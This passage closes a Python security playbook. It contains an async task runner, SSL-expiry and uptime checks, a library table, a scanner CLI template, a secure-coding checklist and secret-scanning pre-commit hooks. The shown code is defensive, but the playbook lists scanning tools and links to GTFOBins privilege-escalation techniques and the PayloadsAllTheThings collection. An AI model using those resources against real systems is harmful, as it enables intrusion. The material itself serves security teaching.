    def register_task(self, name: str, func: Callable, **kwargs):
        """Register a task for automation."""
        self.tasks[name] = Task(name=name, func=func, **kwargs)
    
    async def run_task(self, task: Task) -> TaskResult:
        """Execute a single task."""
        start_time = datetime.utcnow()
        
        try:
            if asyncio.iscoroutinefunction(task.func):
                result = await task.func(*task.args, **(task.kwargs or {}))
            else:
                result = task.func(*task.args, **(task.kwargs or {}))
            
            return TaskResult(
                task_name=task.name,
                success=True,
                result=result,
                duration=(datetime.utcnow() - start_time).total_seconds(),
            )
        except Exception as e:
            return TaskResult(
                task_name=task.name,
                success=False,
                result=None,
                error=str(e),
                duration=(datetime.utcnow() - start_time).total_seconds(),
            )
    
    async def run_all(self) -> List[TaskResult]:
        """Run all registered tasks."""
        tasks = [
            self.run_task(task) 
            for task in self.tasks.values() 
            if task.enabled
        ]
        results = await asyncio.gather(*tasks)
        self.results.extend(results)
        return results
    
    def get_summary(self) -> Dict:
        """Get execution summary."""
        successful = sum(1 for r in self.results if r.success)
        failed = sum(1 for r in self.results if not r.success)
        
        return {
            'total_tasks': len(self.results),
            'successful': successful,
            'failed': failed,
            'total_duration': sum(r.duration for r in self.results),
        }


# Example security tasks
async def check_ssl_certificate(domain: str) -> Dict:
    """Check SSL certificate expiration."""
    import ssl
    import socket
    
    context = ssl.create_default_context()
    
    with socket.create_connection((domain, 443), timeout=10) as sock:
        with context.wrap_socket(sock, server_hostname=domain) as ssock:
            cert = ssock.getpeercert()
            
            not_after = datetime.strptime(
                cert['notAfter'], 
                '%b %d %H:%M:%S %Y %Z'
            )
            
            days_until_expiry = (not_after - datetime.utcnow()).days
            
            return {
                'domain': domain,
                'expires': not_after.isoformat(),
                'days_until_expiry': days_until_expiry,
                'is_expiring_soon': days_until_expiry < 30
            }


async def check_website_availability(url: str) -> Dict:
    """Check if website is accessible."""
    async with aiohttp.ClientSession() as session:
        start = datetime.utcnow()
        try:
            async with session.get(url, timeout=10) as response:
                return {
                    'url': url,
                    'status': response.status,
                    'response_time': (datetime.utcnow() - start).total_seconds(),
                    'is_up': response.status == 200
                }
        except Exception as e:
            return {
                'url': url,
                'status': 0,
                'error': str(e),
                'is_up': False
            }
```

---

## 13. Security Libraries Reference

### Essential Libraries

| Library | Purpose | Install |
|---------|---------|---------|
| **cryptography** | Modern cryptographic operations | `pip install cryptography` |
| **argon2-cffi** | Password hashing (Argon2) | `pip install argon2-cffi` |
| **pycryptodome** | Cryptographic primitives | `pip install pycryptodome` |
| **requests** | HTTP client | `pip install requests` |
| **aiohttp** | Async HTTP client | `pip install aiohttp` |
| **scapy** | Packet manipulation | `pip install scapy` |
| **python-nmap** | Nmap wrapper | `pip install python-nmap` |
| **paramiko** | SSH protocol | `pip install paramiko` |
| **pefile** | PE file analysis | `pip install pefile` |
| **yara-python** | Malware detection | `pip install yara-python` |
| **dnspython** | DNS toolkit | `pip install dnspython` |
| **beautifulsoup4** | HTML parsing | `pip install beautifulsoup4` |
| **bandit** | Security linter | `pip install bandit` |
| **safety** | Dependency checker | `pip install safety` |

### Requirements Template

```txt
# requirements.txt - Security Project Dependencies

# Core Security
cryptography>=42.0.0
argon2-cffi>=23.1.0
pycryptodome>=3.20.0

# Network
requests>=2.31.0
aiohttp>=3.9.0
scapy>=2.5.0
python-nmap>=0.7.1
paramiko>=3.4.0
dnspython>=2.5.0

# Web
beautifulsoup4>=4.12.0
lxml>=5.1.0

# Analysis
pefile>=2023.2.7
yara-python>=4.5.0

# Utilities
python-dotenv>=1.0.0
pyyaml>=6.0.1
click>=8.1.7

# Development
bandit>=1.7.7
safety>=2.3.5
pytest>=8.0.0
```

---

## 14. Code Templates

### Project Template

```python
#!/usr/bin/env python3
"""
Security Tool Template
Author: PinkOffense Security
"""
import argparse
import logging
import sys
from pathlib import Path

__version__ = "1.0.0"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-8s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)


def parse_args() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Security Tool Description",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    
    parser.add_argument('-t', '--target', help='Target to scan')
    parser.add_argument('-o', '--output', type=Path, help='Output file')
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('--version', action='version', version=f'%(prog)s {__version__}')
    
    return parser.parse_args()


def main() -> int:
    """Main entry point."""
    args = parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    try:
        logger.info(f"Starting scan of {args.target}")
        # Your code here
        logger.info("Scan complete")
        return 0
        
    except KeyboardInterrupt:
        logger.warning("Interrupted by user")
        return 130
    except Exception as e:
        logger.error(f"Error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
```

---

## 15. Best Practices Checklist

```
┌─────────────────────────────────────────────────────────────┐
│              SECURE CODING CHECKLIST                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│ INPUT VALIDATION                                             │
│ [ ] Validate all user input                                  │
│ [ ] Use whitelist validation when possible                   │
│ [ ] Sanitize output for context (HTML, JS, SQL)              │
│ [ ] Validate file uploads (type, size, content)              │
│ [ ] Check array bounds and integer overflows                 │
│                                                              │
│ AUTHENTICATION & AUTHORIZATION                               │
│ [ ] Use Argon2id for password hashing                        │
│ [ ] Implement rate limiting on auth endpoints                │
│ [ ] Use secure session management                            │
│ [ ] Implement proper access controls                         │
│ [ ] Never store plaintext passwords                          │
│                                                              │
│ CRYPTOGRAPHY                                                 │
│ [ ] Use well-tested libraries (cryptography)                 │
│ [ ] Use AES-256-GCM or ChaCha20-Poly1305                     │
│ [ ] Generate keys with secrets module                        │
│ [ ] Never implement custom crypto algorithms                 │
│ [ ] Use proper key derivation (PBKDF2, Scrypt, Argon2)       │
│                                                              │
│ ERROR HANDLING                                               │
│ [ ] Never expose stack traces to users                       │
│ [ ] Log errors securely (no sensitive data)                  │
│ [ ] Use generic error messages externally                    │
│ [ ] Implement proper exception handling                      │
│                                                              │
│ DATA PROTECTION                                              │
│ [ ] Encrypt sensitive data at rest                           │
│ [ ] Use TLS for data in transit                              │
│ [ ] Implement secure data deletion                           │
│ [ ] Minimize data collection                                 │
│                                                              │
│ DEPENDENCIES                                                 │
│ [ ] Pin dependency versions                                  │
│ [ ] Run safety/pip-audit regularly                           │
│ [ ] Use virtual environments                                 │
│ [ ] Review dependency licenses                               │
│                                                              │
│ CODE QUALITY                                                 │
│ [ ] Run bandit for security linting                          │
│ [ ] Use type hints                                           │
│ [ ] Write unit tests                                         │
│ [ ] Document security assumptions                            │
│ [ ] Code review for security                                 │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Security Testing Commands

```bash
# Static Analysis with Bandit
bandit -r src/ -f json -o bandit-report.json

# Dependency Vulnerability Check
safety check --full-report
pip-audit --strict

# Type Checking
mypy src/ --strict

# Run Tests with Coverage
pytest tests/ --cov=src --cov-report=html

# Check for Secrets
gitleaks detect --source . --verbose
trufflehog filesystem . --only-verified
```

### Pre-commit Configuration

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: check-yaml
      - id: detect-private-key
      - id: detect-aws-credentials

  - repo: https://github.com/PyCQA/bandit
    rev: 1.7.7
    hooks:
      - id: bandit
        args: ["-r", "src/", "-ll"]

  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
```

---

## 📚 Additional Resources

### Online Learning
- **TryHackMe** - Hands-on cybersecurity training
- **HackTheBox** - Penetration testing labs
- **PortSwigger Academy** - Web security
- **PentesterLab** - Real-world exercises

### Documentation
- [Python Cryptography](https://cryptography.io/)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [Scapy Documentation](https://scapy.readthedocs.io/)

### Tools
- [CyberChef](https://gchq.github.io/CyberChef/) - Data encoding/decoding
- [GTFOBins](https://gtfobins.github.io/) - Unix privilege escalation
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## 🎯 Summary

This playbook covers essential Python security practices:

| Area | Key Topics |
|------|------------|
| **Secure Coding** | Input validation, output encoding, secure APIs |
| **Cryptography** | AES-GCM, Argon2, HMAC, key management |
| **Network Security** | Port scanning, packet analysis, reconnaissance |
| **Web Security** | SQLi, XSS, LFI testing, header analysis |
| **Malware Analysis** | PE parsing, string extraction, IOC extraction |
| **Digital Forensics** | Evidence acquisition, integrity verification |
| **Automation** | Async tasks, scheduled security checks |

**Key Principles:**
1. Always validate and sanitize input
2. Use established cryptographic libraries
3. Never store secrets in code
4. Log securely without sensitive data
5. Keep dependencies updated
6. Test security continuously

---

*Document created for professional reference.*
*PinkOffense Security | B1naryBun 🐰💜*
